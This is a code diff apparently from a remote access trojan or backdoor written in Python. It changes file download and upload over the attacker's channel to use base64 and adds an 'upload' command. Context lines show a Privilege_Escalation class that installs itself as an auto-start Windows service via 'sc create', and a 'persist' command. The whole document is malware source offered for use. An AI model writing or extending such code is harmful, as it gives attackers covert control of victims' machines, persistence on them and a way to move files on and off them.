@@ -417,13 +417,15 @@ class Filesystem:
 				while True:
 					data = f.read(8192)
 					if not data: break
-					channel.write_output(data)
+					channel.write_output(base64.b64encode(data))
 					time.sleep(0.1) # Sleep, otherwise some data will be missing and jumbled
-			time.sleep(2)
-			ch.write_output(chr(255)*50)
-			time.sleep(5)
+			
+			channel.write_output(base64.b64encode(chr(255)))
+			
 		except Exception as e:
 			channel.write_output("Error: "+str(e))
+		
+		return ""
 			
 	def upload(self, path, channel):
 		logging.info("Starting upload of file: "+path)
@@ -431,9 +433,16 @@ class Filesystem:
 		with open(path, "wb") as f:
 			while True:
 				data = channel.read_input()
-				if data.endswith(chr(255)): break
+				if data == "CONN_LOST": return True
+				data = base64.b64decode(data)
+				if data.endswith(chr(255)):
+					data = data[:-1]
+					if not data: break
+					f.write(data)
+					break
 				f.write(data)
 			logging.info("Upload complete.")
+			return ""
 			
 class Miscellaneous:
 	"""
@@ -508,7 +517,7 @@ class Privilege_Escalation:
 		if execute.execute_shell_command("sc create "+name+" binPath= "+path+" start= auto")[0] != 0:
 			return False
 		if execute.execute_shell_command("sc start "+name)[0] != 0: # TODO: check why this is broken
-			return False
+			return False											# Broken cuz we're not a proper service
 		return True
 		
 	@windows_only
@@ -797,7 +806,12 @@ help - This menu!
 				
 			elif data.startswith("download"):
 				file = data.split()[1]
-				output = fs.download(file, self.transport)
+				output = fs.download(file, self.channel)
+				
+			elif data.startswith("upload"):
+				file = data.split()[1]
+				output = fs.upload(file, self.channel)
+				if output: return False
 				
 			elif data == "persist":
 				output = misc.persist()
